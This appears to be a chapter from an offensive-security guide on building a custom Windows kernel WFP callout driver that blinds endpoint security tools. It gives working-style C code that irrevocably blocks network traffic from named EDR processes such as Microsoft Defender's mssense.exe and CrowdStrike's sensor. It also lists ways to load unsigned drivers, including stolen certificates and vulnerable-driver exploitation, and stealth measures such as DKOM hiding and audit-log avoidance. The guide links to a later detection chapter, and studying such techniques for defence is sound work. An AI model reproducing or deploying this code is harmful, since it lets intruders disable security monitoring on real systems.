# Technique 07 — Custom WFP Callout Driver

## Overview

Writing a custom kernel-mode WFP callout driver gives the most control and stealth
for network blocking. Unlike user-mode filter injection, a callout:
- Issues kernel-level verdicts that cannot be overridden by user-mode filters
- Can perform deep packet inspection (DPI) before deciding
- Can conditionally block based on packet content, not just metadata
- Can be loaded as a legitimate-looking system driver

This is the most powerful technique but also the most complex — it requires kernel
driver development skills and Driver Signature Enforcement (DSE) bypass if unsigned.

---

## Architecture of a WFP Callout Driver

A callout driver plugs into the WFP framework by registering callback functions:

```
User-mode: Fwpm* APIs  ←→  BFE service (filter engine)
                                   ↕
Kernel-mode callout driver registers:
    - FwpsCalloutRegister()     ← registers classify/notify/flowDelete callbacks
    - FwpmCalloutAdd()          ← registers callout metadata with BFE
    - FwpmFilterAdd()           ← creates filter with action=CALLOUT that triggers the callout
```

---

## Minimal Callout Driver Structure

### Driver Entry

```c
DRIVER_DISPATCH FilterDispatch;
DRIVER_UNLOAD FilterUnload;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    // Create device object (optional but conventional)
    UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\MyCallout");
    PDEVICE_OBJECT devObj;
    IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &devObj);

    DriverObject->MajorFunction[IRP_MJ_CREATE] = FilterDispatch;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]  = FilterDispatch;
    DriverObject->DriverUnload = FilterUnload;

    // Register with WFP
    RegisterCallout(devObj);
    return STATUS_SUCCESS;
}
```

### Registering the Callout

```c
GUID calloutGuid = { /* your unique GUID */ };
UINT32 calloutId;

NTSTATUS RegisterCallout(PDEVICE_OBJECT devObj) {
    // Step 1: Register the callout functions with FWPS (kernel API)
    FWPS_CALLOUT callout = {0};
    callout.calloutKey     = calloutGuid;
    callout.classifyFn     = MyClassifyFn;
    callout.notifyFn       = MyNotifyFn;
    callout.flowDeleteFn   = MyFlowDeleteFn;
    FwpsCalloutRegister(devObj, &callout, &calloutId);

    // Step 2: Open handle to BFE
    HANDLE engineHandle;
    FwpmEngineOpen(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &engineHandle);

    // Step 3: Add callout metadata (FWPM layer)
    FWPM_CALLOUT fwpmCallout = {0};
    fwpmCallout.calloutKey = calloutGuid;
    fwpmCallout.displayData.name = L"MyEDRBlockCallout";
    fwpmCallout.applicableLayer = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    FwpmCalloutAdd(engineHandle, &fwpmCallout, NULL, NULL);

    // Step 4: Add a filter that triggers this callout
    FWPM_FILTER filter = {0};
    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
    filter.action.type = FWP_ACTION_CALLOUT_TERMINATING;
    filter.action.calloutKey = calloutGuid;
    // Set conditions (e.g., match specific app path)
    UINT64 filterId;
    FwpmFilterAdd(engineHandle, &filter, NULL, &filterId);

    FwpmEngineClose(engineHandle);
    return STATUS_SUCCESS;
}
```

### The Classify Function (Core Logic)

```c
void MyClassifyFn(
    const FWPS_INCOMING_VALUES *inFixedValues,
    const FWPS_INCOMING_METADATA_VALUES *inMetaValues,
    void *layerData,
    const void *classifyContext,
    const FWPS_FILTER *filter,
    UINT64 flowContext,
    FWPS_CLASSIFY_OUT *classifyOut)
{
    // Extract process image path from metadata
    if (inMetaValues->currentMetadataValues & FWPS_METADATA_FIELD_PROCESS_PATH) {
        UNICODE_STRING *processPath = inMetaValues->processPath;

        // Check if this is an EDR process we want to block
        if (IsTargetEdrProcess(processPath)) {
            // Issue a hard BLOCK — cannot be overridden
            classifyOut->actionType = FWP_ACTION_BLOCK;
            // Remove the right for subsequent filters to change this verdict
            classifyOut->rights &= ~FWPS_RIGHT_ACTION_WRITE;
            return;
        }
    }

    // Default: permit the connection
    classifyOut->actionType = FWP_ACTION_PERMIT;
}
```

The key line: `classifyOut->rights &= ~FWPS_RIGHT_ACTION_WRITE`

This makes the block verdict **irrevocable** — no user-mode filter, no other callout,
nothing can override it within the same layer evaluation.

---

## Matching by Process Image Path

```c
BOOLEAN IsTargetEdrProcess(UNICODE_STRING *processPath) {
    // List of EDR paths to block
    static const WCHAR *targets[] = {
        L"\\device\\harddiskvolume3\\windows\\system32\\mssense.exe",
        L"\\device\\harddiskvolume3\\program files\\crowdstrike\\csfalconservice.exe",
        // ...
    };

    UNICODE_STRING normalized;
    // RtlDowncaseUnicodeString() to normalize case
    for (int i = 0; i < ARRAYSIZE(targets); i++) {
        UNICODE_STRING target;
        RtlInitUnicodeString(&target, targets[i]);
        if (RtlEqualUnicodeString(&normalized, &target, TRUE)) {
            return TRUE;
        }
    }
    return FALSE;
}
```

---

## Loading the Driver

### Signed Driver (Recommended for Stealth)

Option A: Use an ELAM (Early Launch Anti-Malware) slot — complex, requires WHQL  
Option B: Self-sign with a test certificate (requires Test Signing mode — detectable)  
Option C: Use a leaked/stolen code signing certificate  
Option D: **BYOVD** — load an existing vulnerable signed driver, exploit it to load
           your unsigned driver via `MmMapIoSpace` or memory writes  
Option E: DSE bypass via the techniques in `../03_byovd/05_dse_bypass.md`

### Service Installation

```c
SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
SC_HANDLE svc = CreateService(
    scm,
    L"MyFilter",               // service name
    L"My Network Filter",      // display name
    SERVICE_ALL_ACCESS,
    SERVICE_KERNEL_DRIVER,
    SERVICE_DEMAND_START,
    SERVICE_ERROR_NORMAL,
    L"\\??\\C:\\Windows\\System32\\drivers\\myfilter.sys",
    L"NDIS",                   // load group
    NULL, NULL, NULL, NULL
);
StartService(svc, 0, NULL);
```

---

## Stealth Considerations

| Concern | Mitigation |
|---|---|
| Driver visible in `sc query type= driver` | Unhide device by not creating device object; remove from service list via DKOM |
| WFP Event 5446 (callout registered) | Filter creation is logged — accept or avoid audit policy |
| WFP Event 5447 (filter added) | Same as above |
| Callout visible in WFPExplorer | Remove from BFE list after loading via `FwpmCalloutDeleteByKey` (callout remains in FWPS) |
| Driver hash in MRTLog | Load from a randomized path with different binary layout each time |

---

## Comparison Across All Techniques

```
Technique                 | Driver? | User-mode? | WFP 5447? | Override-able? | Complexity
--------------------------|---------|------------|-----------|----------------|----------
WFP Filter Injection      |  No     |  Yes       |  Yes      |  Maybe         | Low
WFP Filter Deletion       |  No     |  Yes       |  Yes      |  N/A           | Low
360WFP BYOVD              |  Yes*   |  Yes (ctrl)|  No       |  No (callout)  | Medium
WinDivert (EDRPrison)     |  Yes*   |  Yes (ctrl)|  No       |  No (kernel)   | Medium
QoS (EDRChoker)           |  No     |  Yes       |  No       |  Partial       | Low
Custom Callout Driver     |  Yes    |  Kernel    |  Yes†     |  No (callout)  | High
```

*Existing signed driver  
†Only during installation; can be minimized

---

## References

- WFP Callout Driver docs: `https://learn.microsoft.com/en-us/windows-hardware/drivers/network/introduction-to-windows-filtering-platform-callout-drivers`
- WFP Callout Research (0mWindyBug): `https://github.com/0mWindyBug/WFPCalloutReserach`
- WFP internals RE: `https://0mwindybug.github.io/WFP/`

---

Next: `08_detection-and-defense.md`
